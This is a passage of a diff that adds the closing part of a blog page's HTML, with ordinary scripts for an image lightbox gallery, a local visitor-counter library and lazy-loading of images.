+      var wrapper = document.createElement('a');
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'));
+      wrapper.setAttribute('aria-label', 'illustration');
+      wrapper.style.cssText = 'width: 100%; display: flex; justify-content: center;';
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt;
+      wrapper.dataset.nolink = true;
+      img[i].before(wrapper);
+      wrapper.append(img[i]);
+      var divWrap = document.createElement('div');
+      divWrap.classList.add('gallery');
+      wrapper.before(divWrap);
+      divWrap.append(wrapper);
+    }
+    baguetteBox.run('.gallery');
+  }
+</script>
+<script>loadScript("/js/lib/lightbox/baguetteBox.min.js", addImgLayout)</script>
+  
+  
+  
+<script src="/js/main.js"></script>
+
+  
+  <script>loadScript("/js/lib/busuanzi.min.js")</script>
+  
+  
+  <script>
+    var addLazyload = function () {
+      var observer = lozad('.lozad', {
+        load: function (el) {
+          el.srcset = el.getAttribute('data-src');
+        },
+        loaded: function (el) {
+          el.classList.add('loaded');
+        }
+      });
+      observer.observe();
+    }
+  </script>
+  <script>loadScript("/js/lib/lozad.min.js", addLazyload)</script>
+  
+  
+</body>
+
+</html>
